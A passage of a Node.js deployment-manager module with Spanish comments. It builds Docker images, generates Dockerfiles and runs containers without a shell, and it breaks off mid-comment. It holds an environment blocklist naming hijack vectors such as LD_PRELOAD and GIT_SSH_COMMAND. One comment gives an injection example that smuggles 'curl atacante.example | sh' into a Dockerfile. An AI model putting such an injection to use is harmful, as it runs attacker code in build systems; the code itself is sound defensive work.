const { spawn } = require('child_process');
const { EventEmitter } = require('events');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const caddyManager = require('./caddyManager');
const repoSync = require('./repoSync');
const { atomicWriteJsonSync, assertContainedPath } = require('./ssrfGuard');

const ROOT_BASE_DIR = process.env.CULKIBO_DATA_DIR
  ? path.resolve(process.env.CULKIBO_DATA_DIR)
  : path.resolve(__dirname, '..', '..');
const TMP_ENV_DIR = path.join(__dirname, '..', '..', 'data', '.tmp');

/** Variables del host que un proyecto jamás puede sobreescribir al invocar herramientas del host. */
const HOST_HIJACK_ENV_BLOCKLIST = new Set([
  'PATH', 'PATHEXT', 'COMSPEC', 'SYSTEMROOT', 'WINDIR',
  'DOCKER_HOST', 'DOCKER_CONFIG', 'DOCKER_CONTEXT', 'DOCKER_CERT_PATH', 'DOCKER_TLS_VERIFY', 'DOCKER_API_VERSION',
  'BUILDKIT_HOST', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH',
  'NODE_OPTIONS', 'BASH_ENV', 'ENV', 'IFS',
  'GIT_SSH_COMMAND', 'GIT_ASKPASS', 'GIT_EXEC_PATH',
  'HOME', 'USERPROFILE', 'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY'
]);

/** Filtra variables de usuario antes de mezclarlas con el entorno de un proceso del host (build/nixpacks). */
function filterSafeHostEnv(vars) {
  /** @type {Record<string, string>} */
  const out = {};
  for (const [k, v] of Object.entries(vars || {})) {
    if (!isValidEnvName(k)) continue;
    if (HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase())) continue;
    out[k] = String(v == null ? '' : v);
  }
  return out;
}

/** @type {any} */
let containerOrchestrator = null;
try { containerOrchestrator = require('./containerOrchestrator'); } catch (e) {}

/** @type {any} */
let notificationService = null;
try { notificationService = require('./notificationService'); } catch (e) {}

/**
 * Despliegue a producción: de un directorio con código a un servicio duradero.
 *
 * Esto es lo que separaba a Culkibo de un ejecutor de procesos de desarrollo.
 * `localRunner` clona y lanza `npm run dev`; aquí construimos una imagen,
 * arrancamos un contenedor con política de reinicio y límites, esperamos a que
 * esté sano y solo entonces movemos la ruta de Caddy.
 *
 * ---------------------------------------------------------------------------
 * POR QUÉ ESTÁ ESCRITO ASÍ (las tres decisiones que no son negociables)
 * ---------------------------------------------------------------------------
 *
 * 1. NUNCA SE CONSTRUYE UNA CADENA DE SHELL.
 *    Todo pasa por `spawn(bin, [argv], { shell: false })`. Los 21 críticos de
 *    Coolify y los 34 de Dokploy son una sola clase de fallo: un nombre de
 *    repositorio, una variable de entorno o un nombre de imagen interpolados en
 *    una cadena que acaba en `sh -c`. Sin shell no hay nada donde inyectar.
 *
 * 2. LOS SECRETOS NO PASAN POR ARGV.
 *    `docker run -e CLAVE` (sin `=valor`) toma el valor del entorno del proceso
 *    que lanza docker. Lo mismo `docker build --build-arg NOMBRE`. Así el valor
 *    viaja por el entorno del hijo y jamás aparece en `ps`, ni en los logs de
 *    build, ni en un mensaje de error. En argv solo viajan NOMBRES, que no son
 *    secretos.
 *
 * 3. CULKIBO NO INYECTA NINGÚN BUILD ARG QUE CAMBIE ENTRE BUILDS.
 *    Coolify se destruyó su propia caché de capas inyectando un argumento que
 *    cambiaba en cada ejecución (issue #7040: 1 min -> 4,5 min).
 *
 *    El mecanismo exacto, según la referencia de Dockerfile de BuildKit: la
 *    línea `ARG` en sí no entra en ninguna clave de caché, pero a partir de ella
 *    la variable se inyecta en el ENTORNO de cada `RUN` posterior, y la clave de
 *    caché de un `RUN` se calcula sobre su línea de comandos MÁS ese entorno.
 *    Por eso el fallo de caché ocurre en el PRIMER USO, no en la definición, y
 *    a partir de ahí se propaga a todas las capas siguientes. Un `ARG` volátil
 *    declarado arriba del fichero tira el build entero.
 *
 *    Aquí el conjunto de build args que aporta Culkibo es literalmente vacío;
 *    solo se pasan los que el usuario declare, y se pasan por nombre.
 *    `tests/deploy.test.js` lo verifica comparando dos invocaciones consecutivas
 *    byte a byte.
 */

// ---------------------------------------------------------------------------
// Parámetros por defecto
//
// Los tiempos siguen a basecamp/kamal-proxy, que es el arte previo correcto
// para esto. Valores leídos de su `internal/server/service.go`:
//   DefaultDeployTimeout        = 30 s
//   DefaultDrainTimeout         = 30 s
//   DefaultHealthCheckInterval  =  1 s
//   DefaultHealthCheckTimeout   =  5 s
//   DefaultHealthCheckPath      = "/up"
//
// Divergencia deliberada: kamal considera sano solo un 200-299 sobre `/up`,
// porque Rails expone ese endpoint por convención. Culkibo despliega cualquier
// cosa que le echen, así que sondea `/` y acepta cualquier estado < 500: un 404
// en la raíz significa que el proceso escucha y enruta —está vivo—, mientras que
// un 502 significa que no. El endpoint y el umbral son configurables.
// ---------------------------------------------------------------------------
const DEFAULTS = {
  buildTimeoutMs: 20 * 60 * 1000,
  healthTimeoutMs: 30000,
  healthIntervalMs: 1000,
  healthPath: '/',
  // Ventana durante la cual el contenedor viejo SIGUE VIVO después de que la
  // ruta ya apunte al nuevo. Es el apretón de manos que le falta a Coolify
  // (issue #8627): allí el contenedor viejo muere a la vez que se recarga el
  // proxy, y las peticiones en vuelo se convierten en 502/503.
  drainTimeoutMs: 30000,
  stopGraceSeconds: 10,
  memoryMb: 1024,
  cpus: '1.0',
  pidsLimit: 512,
  containerPort: 3000,
  // Generaciones que se conservan paradas (no borradas) para que un rollback
  // sea arrancar-y-conmutar en vez de reconstruir.
  keepReleases: 2,
  network: 'culkibo',
  caddyContainerName: process.env.CULKIBO_CADDY_CONTAINER || 'culkibo-caddy'
};

const STORE_FILE = path.join(__dirname, '..', '..', 'data', 'deployments.json');

// ---------------------------------------------------------------------------
// Saneadores
//
// Todo lo que viene del proyecto (id, nombre, package.json del repositorio
// clonado) es influenciable por quien controla el repositorio. Antes de que
// toque un argv o el texto de un Dockerfile pasa por aquí.
// ---------------------------------------------------------------------------

/** Etiqueta apta para nombre de imagen/contenedor de Docker. */
function safeSlug(value, fallback = 'app') {
  const slug = String(value == null ? '' : value)
    .toLowerCase()
    .replace(/[^a-z0-9_.-]/g, '-')
    .replace(/^[^a-z0-9]+/, '')
    .replace(/-+/g, '-')
    .slice(0, 48);
  return slug || fallback;
}

/**
 * Un nombre de variable de entorno válido en POSIX.
 *
 * Importa más de lo que parece: el nombre SÍ viaja en argv. Si aceptásemos
 * cualquier cosa, una clave llamada `--privileged` acabaría en la línea de
 * comandos de `docker run`. Docker la consumiría como valor de `-e`, pero no
 * queremos depender de ese detalle: se rechaza y punto.
 */
function isValidEnvName(name) {
  return typeof name === 'string' && /^[A-Za-z_][A-Za-z0-9_]{0,254}$/.test(name);
}

/**
 * Ruta de sondeo de salud. Va tanto a una URL como al `--health-cmd` del
 * contenedor, así que se restringe a un subconjunto sin comillas, espacios ni
 * `..`.
 */
function sanitizeHealthPath(value) {
  const raw = String(value == null ? '' : value).trim() || '/';
  if (!/^\/[A-Za-z0-9._~\-/]*$/.test(raw)) return null;
  if (raw.includes('..')) return null;
  return raw;
}

/**
 * Versión mayor de Node declarada en `engines`.
 *
 * Esto se escribe dentro de una línea `FROM` de un Dockerfile generado. Un
 * `engines.node` de `22-alpine\nRUN curl atacante.example | sh` sería ejecución
 * de código en el build si lo copiásemos tal cual. Solo se acepta un entero.
 */
function sanitizeNodeMajor(value) {
  const match = String(value == null ? '' : value).match(/(\d{1,2})/);
  if (!match) return null;
  const major = parseInt(match[1], 10);
  return major >= 18 && major <= 40 ? String(major) : null;
}

/** Puerto TCP válido. */
function sanitizePort(value, fallback) {
  const port = parseInt(value, 10);
  return Number.isInteger(port) && port > 0 && port < 65536 ? port : fallback;
}

class DeployManager extends EventEmitter {
  constructor() {
    super();
    /** projectId -> Promise, para serializar despliegues del mismo proyecto. */
    this.locks = new Map();
    /**
     * projectId -> { project, options } pendiente de lanzar cuando termine el
     * despliegue en curso. Una sola plaza y gana el último: si llegan tres
     * pushes durante un build de cuatro minutos, lo que hay que desplegar
     * después es el ÚLTIMO commit, no los tres en fila.
     */
    this.pending = new Map();
    /** projectId -> Promise del drenaje en curso (las pruebas lo esperan). */
    this.drains = new Map();
    /** projectId -> { timer, resolve } para cancelar drenajes pendientes tras rollback/stop/shutdown (P0-3). */
    this._drainTimers = new Map();
    /** Puertos reservados en vuelo entre findFreePort() y docker run (P1-8). */
    this._pendingPorts = new Set();
    /** @type {any} */
    this.dockerProbe = null;
    this.dockerProbeAt = 0;
    this.dockerProbeTtlMs = 15000;
    /** Cachés TTL de 60 s para evitar spawns repetitivos de `hasBinary` y `ensureNetwork`. */
    this._binaryCache = new Map();
    this._networkCache = new Map();
    /** @type {Record<string, any>} */
    this.store = this.loadStore();
  }

  // -------------------------------------------------------------------------
  // Persistencia
  // -------------------------------------------------------------------------

  loadStore() {
    try {
      if (fs.existsSync(STORE_FILE)) {
        const parsed = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
        if (parsed && typeof parsed === 'object') return parsed;
      }
    } catch (e) {
      console.error('[DeployManager] No se pudo leer deployments.json:', e.message);
    }
    return {};
  }

  /** Escritura atómica con permisos 0600. */
  saveStore() {
    try {
      atomicWriteJsonSync(STORE_FILE, this.store, 0o600);
    } catch (e) {
      console.error('[DeployManager] No se pudo guardar deployments.json:', e.message);
    }
  }

  getState(projectId) {
    if (!this.store[projectId]) {
      this.store[projectId] = { current: null, previous: null, history: [] };
    }
    return this.store[projectId];
  }

  /** Historial de despliegues, el más reciente primero. */
  listDeployments(projectId, limit = 20) {
    return this.getState(projectId).history.slice(0, limit);
  }

  getDeployment(projectId, deploymentId) {
    return this.getState(projectId).history.find(d => d.id === deploymentId) || null;
  }

  cancelDrain(projectId) {
    const entry = this._drainTimers.get(projectId);
    if (!entry) return;
    clearTimeout(entry.timer);
    this._drainTimers.delete(projectId);
    entry.resolve(true); // true = cancelado
  }

  cancelAllDrains() {
    for (const pid of Array.from(this._drainTimers.keys())) {
      this.cancelDrain(pid);
    }
  }

  /**
   * Olvida todo lo que sabemos de un proyecto borrado y retira sus contenedores
   * de producción en segundo plano para no dejarlos huérfanos (P1-9).
   */
  forget(projectId) {
    this.cancelDrain(projectId);
    const prevState = this.store[projectId];
    const had = Boolean(prevState);
    delete this.store[projectId];
    this.pending.delete(projectId);
    if (had) {
      this.saveStore();
      const names = [prevState.current?.containerName, prevState.previous?.containerName].filter(Boolean);
      if (names.length > 0) {
        Promise.allSettled([
          caddyManager.removeRoute(projectId).catch(() => {}),
          ...names.map((n) => this.runDocker(['rm', '-f', n], { timeoutMs: 20000 }).catch(() => {}))
        ]).catch(() => {});
      }
    }
    return { removed: had };
  }

  // -------------------------------------------------------------------------
  // Ejecución de binarios externos — sin shell, nunca
  // -------------------------------------------------------------------------

  /**
   * Lanza un binario con un array de argumentos y transmite su salida línea a
   * línea.
   *
   * `shell: false` es lo que convierte la inyección de comandos en imposible en
   * vez de en improbable. `env` permite pasar valores (secretos incluidos) sin
   * que aparezcan en argv.
   */
  /**
   * @param {string} bin
   * @param {string[]} args
   * @param {{timeoutMs?: number, cwd?: string, env?: any, onLine?: ((line: string) => void) | null}} [options]
   * @returns {Promise<{code: number, stdout: string, stderr: string, spawnError?: boolean, timedOut?: boolean}>}
   */
  runTool(bin, args, { timeoutMs = 120000, cwd = undefined, env = undefined, onLine = null } = {}) {
    return new Promise((resolve) => {
      let child;
      try {
        child = spawn(bin, args, {
          cwd,
          env: env || process.env,
          shell: false,
          windowsHide: true
        });
      } catch (err) {
        return resolve({ code: -1, stdout: '', stderr: err.message, spawnError: true });
      }

      /** @type {string[]} */
      const stdout = [];
      /** @type {string[]} */
      const stderr = [];
      let buffered = '';

      const pump = (chunk, sink) => {
        const text = chunk.toString();
        sink.push(text);
        if (sink.length > 2000) sink.shift();
        if (!onLine) return;
        buffered += text;
        const lines = buffered.split(/\r?\n/);
        buffered = lines.pop() || '';
        for (const line of lines) {
          if (line.trim()) onLine(line.trim());
        }
      };

      child.stdout.on('data', (d) => pump(d, stdout));
      child.stderr.on('data', (d) => pump(d, stderr));

      let timedOut = false;
      const timer = setTimeout(() => {
        timedOut = true;
        try { child.kill('SIGKILL'); } catch (e) {}
      }, timeoutMs);
      if (timer.unref) timer.unref();

      child.on('error', (err) => {
        clearTimeout(timer);
        resolve({ code: -1, stdout: stdout.join(''), stderr: err.message, spawnError: true });
      });

      child.on('close', (code) => {
        clearTimeout(timer);
        if (buffered.trim() && onLine) onLine(buffered.trim());
        resolve({
          code: timedOut ? -2 : code,
          stdout: stdout.join(''),
          stderr: stderr.join(''),
          timedOut
        });
      });
    });
  }

  runDocker(args, options = {}) {
    return this.runTool('docker', args, options);
  }

  /** ¿Hay un daemon de Docker con el que hablar? No lanza nunca. */
  async detectDocker({ force = false } = {}) {
    const now = Date.now();
    if (!force && this.dockerProbe && (now - this.dockerProbeAt) < this.dockerProbeTtlMs) {
      return this.dockerProbe;
    }
    const res = await this.runDocker(['version', '--format', '{{.Server.Version}}'], { timeoutMs: 5000 });
    const version = (res.stdout || '').trim();
    this.dockerProbe = res.code === 0 && version
      ? { available: true, version, reason: null }
      : {
          available: false,
          version: null,
          reason: res.spawnError
            ? 'El cliente de Docker no está instalado en este host'
            : 'El daemon de Docker no responde en este host'
        };
    this.dockerProbeAt = now;
    return this.dockerProbe;
  }

  /** ¿Está `bin` en el PATH? Cacheado 60 s para no spawnear por cada build. */
  async hasBinary(bin) {
    if (!/^[a-z0-9_-]+$/i.test(bin)) return false;
    const now = Date.now();
    const cached = this._binaryCache.get(bin);
    if (cached && (now - cached.at) < 60000) return cached.ok;
    const res = await this.runTool(bin, ['--version'], { timeoutMs: 4000 });
    const ok = res.code === 0;
    this._binaryCache.set(bin, { at: now, ok });
    return ok;
  }

  // -------------------------------------------------------------------------
  // 1. Detección de la estrategia de construcción
  // -------------------------------------------------------------------------

  readJson(file) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return null; }
  }

  /**
   * Decide cómo se construye este proyecto.
   *
   * Orden: Dockerfile del usuario > railpack > nixpacks > Dockerfile generado.
   *
   * Railpack es el sucesor en Go de Nixpacks escrito por Railway (MIT). Se
   * prefiere cuando está porque produce imágenes más pequeñas y su detección
   * cubre más stacks que la nuestra. Pero es una dependencia OPCIONAL: si no
   * está ninguno de los dos, generamos un Dockerfile y seguimos. Culkibo no
   * puede exigir instalar un binario extra para desplegar una app de Node.
   */
  async detectStrategy(contextDir, project = {}) {
    const pkgPath = path.join(contextDir, 'package.json');
    const pkg = fs.existsSync(pkgPath) ? this.readJson(pkgPath) : null;
    const deps = pkg ? { ...(pkg.dependencies || {}), ...(pkg.devDependencies || {}) } : {};
    const scripts = (pkg && pkg.scripts) || {};

    const declaredPort = sanitizePort(project.containerPort, null);
    const healthPath = sanitizeHealthPath(project.healthPath) || DEFAULTS.healthPath;

    // --- Dockerfile del usuario: manda sobre todo lo demás ------------------
    const userDockerfile = ['Dockerfile', 'dockerfile'].find(
      name => fs.existsSync(path.join(contextDir, name))
    );
    if (userDockerfile) {
      return {
        builder: 'dockerfile',
        stack: 'dockerfile',
        dockerfile: userDockerfile,
        containerPort: declaredPort || this.readExposedPort(path.join(contextDir, userDockerfile)) || DEFAULTS.containerPort,
        healthPath,
        // Un Dockerfile ajeno puede traer su propio HEALTHCHECK; no lo pisamos.
        injectHealthcheck: false,
        reason: `Se usará el ${userDockerfile} del repositorio`
      };
    }

    // --- Detección del stack ------------------------------------------------
    const detected = this.detectStack(contextDir, pkg, deps, scripts);

    // --- Constructores externos, si están --------------------------------
    //
    // Railpack primero: es el sucesor en Go de Nixpacks, escrito por Railway y
    // con licencia MIT. Pero tiene un requisito duro que Nixpacks no tiene:
    // habla el protocolo del cliente de BuildKit directamente y aborta nada más
    // arrancar si `BUILDKIT_HOST` no está definido. Tenerlo en el PATH no basta,
    // así que se comprueba y, si no está configurado, se sigue bajando por la
    // lista en vez de fallar el despliegue.
    for (const bin of ['railpack', 'nixpacks']) {
      if (!(await this.hasBinary(bin))) continue;
      if (bin === 'railpack' && !process.env.BUILDKIT_HOST) {
        continue; // sin BUILDKIT_HOST, railpack no puede construir nada
      }
      return {
        builder: bin,
        stack: detected.stack,
        dockerfile: null,
        containerPort: declaredPort || detected.containerPort,
        healthPath,
        injectHealthcheck: false,
        reason: `No hay Dockerfile; se construirá con ${bin} (detectado en el PATH)`
      };
    }

    if (await this.hasBinary('railpack')) {
      // Estaba, pero inutilizable. Decirlo es mejor que ignorarlo en silencio.
      console.warn('[DeployManager] railpack está instalado pero BUILDKIT_HOST no está definido; se ignora');
    }

    return {
      builder: 'generated',
      stack: detected.stack,
      dockerfile: null,
      containerPort: declaredPort || detected.containerPort,
      healthPath,
      injectHealthcheck: true,
      nodeMajor: detected.nodeMajor,
      startCommand: detected.startCommand,
      buildScript: detected.buildScript,
      outputDir: detected.outputDir,
      pythonEntry: detected.pythonEntry,
      reason: detected.stack === 'desconocido'
        ? 'No se ha podido identificar el stack; no hay Dockerfile ni railpack/nixpacks instalados'
        : `No hay Dockerfile; se generará uno para ${detected.stack}`
    };
  }

  /** Lee el primer EXPOSE de un Dockerfile para saber a qué puerto hablar. */
  readExposedPort(dockerfilePath) {
    try {
      const text = fs.readFileSync(dockerfilePath, 'utf8');
      const match = text.match(/^\s*EXPOSE\s+(\d{1,5})/im);
      return match ? sanitizePort(match[1], null) : null;
    } catch (e) {
      return null;
    }
  }

  /** Clasificación del stack a partir de lo que hay en disco. */
  detectStack(contextDir, pkg, deps, scripts) {
    const exists = (...p) => fs.existsSync(path.join(contextDir, ...p));
    const nodeMajor = pkg && pkg.engines ? sanitizeNodeMajor(pkg.engines.node) : null;

    if (pkg) {
      if (deps.next || /next\s+build/.test(scripts.build || '')) {
        return { stack: 'next', containerPort: 3000, nodeMajor, buildScript: 'build', startCommand: null };
      }
      const buildsStatic =
        deps.vite || deps['@vitejs/plugin-react'] || deps['react-scripts'] ||
        /vite\s+build|react-scripts\s+build|ng\s+build|astro\s+build/.test(scripts.build || '');
      if (buildsStatic) {
        // Vite escribe en dist/, CRA en build/. Angular en dist/<nombre>, que no
        // adivinamos: por eso la salida es configurable y esto es solo el valor
        // por defecto sensato.
        const outputDir = deps['react-scripts'] ? 'build' : 'dist';
        return { stack: 'vite', containerPort: 80, nodeMajor, buildScript: 'build', outputDir };
      }
      return {
        stack: 'node',
        containerPort: 3000,
        nodeMajor,
        buildScript: scripts.build ? 'build' : null,
        startCommand: scripts.start ? 'start' : null
      };
    }

    if (exists('go.mod')) {
      return { stack: 'go', containerPort: 8080 };
    }

    if (exists('requirements.txt') || exists('pyproject.toml')) {
      const entry = ['main.py', 'app.py', 'wsgi.py', 'manage.py'].find(f => exists(f)) || null;
      return { stack: 'python', containerPort: 8000, pythonEntry: entry };
    }

    if (exists('index.html') || exists('public', 'index.html')) {
      return { stack: 'static', containerPort: 80, outputDir: exists('public', 'index.html') ? 'public' : '.' };
    }

    return { stack: 'desconocido', containerPort: DEFAULTS.containerPort };
  }

  // -------------------------------------------------------------------------
  // 2. Generación de Dockerfile
  // -------------------------------------------------------------------------

  /**
   * `.dockerignore` por defecto cuando el repo no aporta uno propio.
   *
   * BuildKit lee automáticamente `<dockerfile>.dockerignore` (aquí
   * `.culkibo/Dockerfile.dockerignore`), así que nunca modificamos ni ensuciamos
   * el árbol del usuario y evitamos enviar cientos de MB de `node_modules` o
   * `.git` al daemon de Docker en cada despliegue.
   */
  defaultDockerignore() {
    return [
      '# Generado por Culkibo para acelerar el contexto de construcción.',
      '.git',
      '.github',
      '.culkibo',
      'node_modules',
      '.next',
      'dist',
      'build',
      'coverage',
      '.env',
      '.env.*',
      '!.env.example',
      '*.log',
      '.DS_Store',
      '__pycache__',
      '.venv',
      'venv',
      ''
    ].join('\n');
  }

  /**
   * Devuelve el texto del Dockerfile que construiría este proyecto.
   *
   * Función pura: recibe la estrategia, devuelve una cadena. Se prueba sin
   * Docker y sin tocar el disco. Todo lo interpolado ya viene saneado (versión
   * de Node entera, puertos enteros, rutas validadas).
   *
   * Usa BuildKit (`syntax=docker/dockerfile:1.7`) con montajes de caché
   * persistentes (`--mount=type=cache`) para que las reconstrucciones sucesivas
   * reutilicen la caché de paquetes sin bajar todo de red cada vez.
   */
  generateDockerfile(strategy) {
    const port = sanitizePort(strategy.containerPort, DEFAULTS.containerPort);
    const nodeTag = `node:${strategy.nodeMajor || '22'}-alpine`;
    const outputDir = /^[A-Za-z0-9._-]+$/.test(String(strategy.outputDir || '')) ? strategy.outputDir : 'dist';

    // Configuración de nginx para una SPA: cualquier ruta que no exista en
    // disco cae en index.html. Va con `printf` entre comillas simples para que
    // ni el shell del contenedor ni Docker toquen los `$uri`.
    const spaConf = "RUN printf 'server {\\n  listen 80;\\n  root /usr/share/nginx/html;\\n  index index.html;\\n  location / { try_files $uri $uri/ /index.html; }\\n}\\n' > /etc/nginx/conf.d/default.conf";

    if (strategy.stack === 'next') {
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${nodeTag} AS deps`,
        'WORKDIR /app',
        'COPY package*.json ./',
        // `npm ci` cuando hay lockfile + caché persistente BuildKit para
        // evitar re-descargas cuando solo cambia una dependencia.
        'RUN --mount=type=cache,target=/root/.npm npm ci --no-audit --no-fund || npm install --no-audit --no-fund',
        '',
        `FROM ${nodeTag} AS build`,
        'WORKDIR /app',
        'COPY --from=deps /app/node_modules ./node_modules',
        'COPY . .',
        'ENV NEXT_TELEMETRY_DISABLED=1',
        'RUN --mount=type=cache,target=/app/.next/cache npm run build',
        '',
        `FROM ${nodeTag} AS runtime`,
        'WORKDIR /app',
        'ENV NODE_ENV=production',
        `ENV PORT=${port}`,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app ./',
        'USER culkibo',
        `EXPOSE ${port}`,
        'CMD ["npm", "run", "start"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'vite') {
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${nodeTag} AS build`,
        'WORKDIR /app',
        'COPY package*.json ./',
        'RUN --mount=type=cache,target=/root/.npm npm ci --no-audit --no-fund || npm install --no-audit --no-fund',
        'COPY . .',
        'RUN --mount=type=cache,target=/app/node_modules/.vite npm run build',
        '',
        'FROM nginx:1.27-alpine AS runtime',
        spaConf,
        `COPY --from=build /app/${outputDir} /usr/share/nginx/html`,
        'EXPOSE 80',
        'CMD ["nginx", "-g", "daemon off;"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'node') {
      const buildStep = strategy.buildScript ? 'RUN npm run build' : '# sin script de build';
      const startCmd = strategy.startCommand
        ? 'CMD ["npm", "run", "start"]'
        : 'CMD ["node", "."]';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        `FROM ${nodeTag} AS deps`,
        'WORKDIR /app',
        'COPY package*.json ./',
        'RUN --mount=type=cache,target=/root/.npm npm ci --no-audit --no-fund || npm install --no-audit --no-fund',
        '',
        `FROM ${nodeTag} AS prod-deps`,
        'WORKDIR /app',
        'COPY package*.json ./',
        'RUN --mount=type=cache,target=/root/.npm npm ci --omit=dev --no-audit --no-fund || npm install --omit=dev --no-audit --no-fund',
        '',
        `FROM ${nodeTag} AS build`,
        'WORKDIR /app',
        'COPY --from=deps /app/node_modules ./node_modules',
        'COPY . .',
        buildStep,
        '',
        `FROM ${nodeTag} AS runtime`,
        'WORKDIR /app',
        'ENV NODE_ENV=production',
        `ENV PORT=${port}`,
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app ./',
        'COPY --from=prod-deps --chown=culkibo:culkibo /app/node_modules ./node_modules',
        'USER culkibo',
        `EXPOSE ${port}`,
        startCmd,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'go') {
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM golang:1.23-alpine AS build',
        'WORKDIR /app',
        'COPY go.mod go.su[m] ./',
        'RUN --mount=type=cache,target=/go/pkg/mod go mod download',
        'COPY . .',
        'RUN --mount=type=cache,target=/go/pkg/mod --mount=type=cache,target=/root/.cache/go-build CGO_ENABLED=0 go build -trimpath -ldflags="-s -w" -o /app/server .',
        '',
        'FROM alpine:3.21 AS runtime',
        'WORKDIR /app',
        'RUN addgroup -S culkibo && adduser -S culkibo -G culkibo',
        'COPY --from=build --chown=culkibo:culkibo /app/server /app/server',
        'USER culkibo',
        `ENV PORT=${port}`,
        `EXPOSE ${port}`,
        'CMD ["/app/server"]',
        ''
      ].join('\n');
    }

    if (strategy.stack === 'python') {
      const entry = /^[A-Za-z0-9._-]+\.py$/.test(String(strategy.pythonEntry || '')) ? strategy.pythonEntry : 'main.py';
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM python:3.12-slim AS runtime',
        'WORKDIR /app',
        'ENV PYTHONUNBUFFERED=1',
        // Crear usuario antes del COPY evita un `chown -R` lento en cada cambio de código.
        'RUN useradd --create-home --shell /usr/sbin/nologin culkibo',
        'COPY requirements.tx[t] pyproject.tom[l] ./',
        'RUN --mount=type=cache,target=/root/.cache/pip if [ -f requirements.txt ]; then pip install -r requirements.txt; elif [ -f pyproject.toml ]; then pip install .; fi',
        'COPY --chown=culkibo:culkibo . .',
        'USER culkibo',
        `EXPOSE ${port}`,
        `CMD ["python", "${entry}"]`,
        ''
      ].join('\n');
    }

    if (strategy.stack === 'static') {
      const root = outputDir === '.' ? '.' : outputDir;
      return [
        '# syntax=docker/dockerfile:1.7',
        '# Generado por Culkibo. Editable: cópialo a ./Dockerfile y tendrá prioridad.',
        'FROM nginx:1.27-alpine AS runtime',
        spaConf,
        `COPY ${root} /usr/share/nginx/html`,
        'EXPOSE 80',
        'CMD ["nginx", "-g", "daemon off;"]',
        ''
      ].join('\n');
    }

    return null;
  }

  /**
   * Orden de `--health-cmd` para las imágenes que generamos nosotros.
   *
   * Solo se inyecta en imágenes propias, donde sabemos qué binarios hay dentro.
   * En una imagen ajena un healthcheck que no puede ejecutarse la marcaría
   * `unhealthy` para siempre y estaríamos mintiendo sobre su estado.
   */
  healthCommandFor(strategy) {
    const port = sanitizePort(strategy.containerPort, DEFAULTS.containerPort);
    const p = sanitizeHealthPath(strategy.healthPath) || '/';
    const url = `http://127.0.0.1:${port}${p}`;
    if (strategy.stack === 'vite' || strategy.stack === 'static' || strategy.stack === 'go') {
      return `wget -q -O /dev/null ${url} || exit 1`; // busybox wget, presente en alpine
    }
    if (strategy.stack === 'python') {
      // P1-31: capturar HTTPError para que APIs que devuelven 401/404 en '/' se consideren sanas (< 500)
      return `python -c "import urllib.request,urllib.error,sys\ntry:\n r=urllib.request.urlopen('${url}')\n sys.exit(0 if r.status<500 else 1)\nexcept urllib.error.HTTPError as e:\n sys.exit(0 if e.code<500 else 1)"`;
    }
    return `node -e "fetch('${url}').then(r=>process.exit(r.status<500?0:1)).catch(()=>process.exit(1))"`;
  }

  // -------------------------------------------------------------------------
  // 3. Construcción de argv
  // -------------------------------------------------------------------------

  /**
   * Argumentos de `docker build`.
   *
   * DETERMINISTA A PROPÓSITO: para la misma entrada devuelve exactamente el
   * mismo array. Ni marcas de tiempo, ni nonces, ni `--build-arg CACHEBUST`.
   * Ese es el fallo #7040 de Coolify y la prueba lo vigila.
   */
  /**
   * @param {{imageTag: string, contextDir: string, dockerfile?: string | null, buildArgNames?: string[], labels?: Record<string, any>}} spec
   * @returns {string[]}
   */
  buildArgs({ imageTag, contextDir, dockerfile = null, buildArgNames = [], labels = {} }) {
    const args = ['build', '--progress=plain', '-t', imageTag];

    if (dockerfile) {
      args.push('-f', path.join(contextDir, dockerfile));
    }

    // Solo NOMBRES. El valor lo toma docker del entorno del proceso hijo, así
    // que un secreto de build nunca aparece en `ps` ni en el log de build.
    for (const name of buildArgNames) {
      if (isValidEnvName(name)) args.push('--build-arg', name);
    }

    // Las etiquetas se escriben en la configuración de la imagen al final; no
    // invalidan la caché de capas (a diferencia de un ARG).
    for (const [key, value] of Object.entries(labels)) {
      if (/^[a-z0-9.\-_]+$/i.test(key)) args.push('--label', `${key}=${String(value).replace(/\s+/g, ' ').slice(0, 200)}`);
    }

    args.push(contextDir);
    return args;
  }

  /**
   * Argumentos de `railpack build` / `nixpacks build`.
   *
   * Los dos toman el directorio como argumento posicional y la etiqueta en
   * `--name`. Donde se separan es en los secretos:
   *
   *   - Nixpacks acepta `--env NOMBRE` a secas y, cita literal de su
   *     documentación, «si no hay signo igual el valor se toma del entorno
   *     actual». Esa es exactamente la forma que necesitamos: el nombre en
   *     argv, el valor en el entorno del hijo.
   *   - Railpack SOLO acepta `--env CLAVE=VALOR`. Pasar un secreto por ahí lo
   *     deja visible en `ps` para cualquier usuario de la máquina, así que a
   *     railpack no se le pasa ninguna variable. Un build que necesite secretos
   *     debe traer su propio Dockerfile.
   */
  /**
   * @param {string} builder
   * @param {{imageTag: string, contextDir: string, envNames?: string[]}} spec
   * @returns {string[]}
   */
  externalBuilderArgs(builder, { imageTag, contextDir, envNames = [] }) {
    if (builder === 'railpack') {
      return ['build', contextDir, '--name', imageTag, '--progress', 'plain'];
    }
    const args = ['build', contextDir, '--name', imageTag];
    for (const name of envNames) {
      if (isValidEnvName(name)) args.push('--env', name);
    }
    return args;
  }

  /**
   * Argumentos de `docker run`.
   *
